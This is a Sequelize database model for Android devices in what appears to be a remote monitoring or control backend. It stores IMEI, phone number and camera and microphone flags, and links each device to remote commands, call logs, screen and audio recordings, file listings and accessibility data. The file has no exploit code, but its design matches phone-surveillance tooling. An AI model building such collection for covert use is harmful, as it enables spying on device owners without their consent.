const { DataTypes } = require('sequelize');

module.exports = (sequelize) => {
  const Device = sequelize.define('Device', {
    id: {
      type: DataTypes.BIGINT.UNSIGNED,
      autoIncrement: true,
      primaryKey: true
    },
    deviceId: {
      type: DataTypes.STRING,
      field: 'deviceId',
      allowNull: false,
      unique: true,
      comment: 'Unique device identifier from Android',
      validate: {
        notEmpty: {
          msg: 'Device ID is required'
        },
        len: {
          args: [5, 255],
          msg: 'Device ID must be between 5 and 255 characters'
        }
      }
    },
    name: {
      type: DataTypes.STRING,
      allowNull: true,
      validate: {
        len: {
          args: [0, 255],
          msg: 'Name cannot exceed 255 characters'
        }
      }
    },
    nickname: {
      type: DataTypes.STRING(255),
      allowNull: true,
      comment: 'User-defined nickname for the device (editable via dashboard)',
      validate: {
        len: {
          args: [0, 255],
          msg: 'Nickname cannot exceed 255 characters'
        }
      }
    },
    model: {
      type: DataTypes.STRING,
      allowNull: true,
      validate: {
        len: {
          args: [0, 100],
          msg: 'Model cannot exceed 100 characters'
        }
      }
    },
    manufacturer: {
      type: DataTypes.STRING,
      allowNull: true,
      validate: {
        len: {
          args: [0, 100],
          msg: 'Manufacturer cannot exceed 100 characters'
        }
      }
    },
    os: {
      type: DataTypes.STRING,
      allowNull: true,
      validate: {
        len: {
          args: [0, 50],
          msg: 'OS name cannot exceed 50 characters'
        }
      }
    },
    osVersion: {
      type: DataTypes.STRING,
      allowNull: true,
      validate: {
        len: {
          args: [0, 50],
          msg: 'OS version cannot exceed 50 characters'
        }
      }
    },
    isOnline: {
      type: DataTypes.BOOLEAN,
      allowNull: false,
      defaultValue: false
    },
    lastSeen: {
      type: DataTypes.DATE,
      field: 'lastSeen',
      allowNull: true
    },
    ipAddress: {
      type: DataTypes.STRING,
      field: 'ip_address',
      allowNull: true,
      validate: {
        isIP: true
      }
    },
    macAddress: {
      type: DataTypes.STRING,
      field: 'macAddress',
      allowNull: true
    },
    userId: {
      type: DataTypes.INTEGER,
      field: 'userId',
      allowNull: true,
      references: {
        model: 'users',
        key: 'id'
      }
    },
    settings: {
      type: DataTypes.TEXT,
      field: 'settings',
      allowNull: true,
      get() {
        const rawValue = this.getDataValue('settings');
        return rawValue ? JSON.parse(rawValue) : null;
      },
      set(value) {
        this.setDataValue('settings', value ? JSON.stringify(value) : null);
      }
    },
    status: {
      type: DataTypes.ENUM('online', 'offline', 'active', 'inactive', 'suspended'),
      field: 'status',
      allowNull: false,
      defaultValue: 'offline'
    },
    imei: {
      type: DataTypes.STRING,
      field: 'imei',
      allowNull: true,
      unique: false
    },
    phoneNumber: {
      type: DataTypes.STRING,
      field: 'phone_number',
      allowNull: true
    },
    registrationDate: {
      type: DataTypes.DATE,
      field: 'registration_date',
      allowNull: true
    },
    appVersion: {
      type: DataTypes.STRING,
      field: 'app_version',
      allowNull: true
    },
    batteryLevel: {
      type: DataTypes.INTEGER,
      field: 'battery_level',
      allowNull: true,
      validate: {
        min: 0,
        max: 100
      }
    },
    isCharging: {
      type: DataTypes.BOOLEAN,
      field: 'is_charging',
      allowNull: false,
      defaultValue: false
    },
    networkType: {
      type: DataTypes.STRING,
      field: 'network_type',
      allowNull: true
    },
    locationEnabled: {
      type: DataTypes.BOOLEAN,
      field: 'location_enabled',
      allowNull: false,
      defaultValue: false
    },
    cameraEnabled: {
      type: DataTypes.BOOLEAN,
      field: 'camera_enabled',
      allowNull: false,
      defaultValue: false
    },
    microphoneEnabled: {
      type: DataTypes.BOOLEAN,
      field: 'microphone_enabled',
      allowNull: false,
      defaultValue: false
    }
  }, {
    tableName: 'devices',
    timestamps: true,
    underscored: false,
    paranoid: true,
    indexes: [
      {
        fields: ['deviceId'],
        name: 'idx_devices_deviceId',
        unique: true
      },
      {
        fields: ['userId', 'status'],
        name: 'idx_user_status'
      },
      // Index for device lookup by IMEI (non-unique)
      {
        fields: ['imei'],
        name: 'idx_imei'
      }
    ]
  });

  // Add any associations here
  Device.associate = (models) => {
    // User association
    Device.belongsTo(models.User, {
      foreignKey: 'userId',
      as: 'user',
      onDelete: 'SET NULL',
      onUpdate: 'CASCADE'
    });

    // Commands association
    Device.hasMany(models.Command, {
      foreignKey: 'deviceId',
      sourceKey: 'deviceId',
      as: 'commands',
      onDelete: 'CASCADE',
      onUpdate: 'CASCADE'
    });

    // DeviceInfo association
    Device.hasOne(models.DeviceInfo, {
      foreignKey: {
        name: 'deviceId',
        field: 'deviceId'
      },
      sourceKey: 'deviceId',
      as: 'deviceInfo',
      onDelete: 'CASCADE',
      onUpdate: 'CASCADE'
    });

    // AppInstallations association
    Device.hasMany(models.AppInstallation, {
      foreignKey: 'deviceId',
      sourceKey: 'deviceId',
      as: 'appInstallations',
      onDelete: 'CASCADE',
      onUpdate: 'CASCADE'
    });

    // CallLogs association
    Device.hasMany(models.CallLog, {
      foreignKey: 'deviceId',
      sourceKey: 'deviceId',
      as: 'callLogs',
      onDelete: 'CASCADE',
      onUpdate: 'CASCADE'
    });

    // ScreenRecordings association
    Device.hasMany(models.ScreenRecording, {
      foreignKey: 'deviceId',
      sourceKey: 'deviceId',
      as: 'screenRecordings',
      onDelete: 'CASCADE',
      onUpdate: 'CASCADE'
    });

    // FileExplorer association
    Device.hasMany(models.FileExplorer, {
      foreignKey: 'deviceId',
      sourceKey: 'deviceId',
      as: 'files',
      onDelete: 'CASCADE',
      onUpdate: 'CASCADE'
    });

    // DeviceAudio association
    Device.hasMany(models.DeviceAudio, {
      foreignKey: 'deviceId',
      sourceKey: 'deviceId',
      as: 'audioRecordings',
      onDelete: 'CASCADE',
      onUpdate: 'CASCADE'
    });

    // AccessibilityData association
    Device.hasMany(models.AccessibilityData, {
      foreignKey: 'deviceId',
      sourceKey: 'deviceId',
      as: 'accessibilityData',
      onDelete: 'CASCADE',
      onUpdate: 'CASCADE'
    });

    // DynamicConfig association
    Device.hasMany(models.DynamicConfig, {
      foreignKey: 'deviceId',
      sourceKey: 'deviceId',
      as: 'configurations',
      onDelete: 'CASCADE',
      onUpdate: 'CASCADE'
    });
  };

  return Device;
};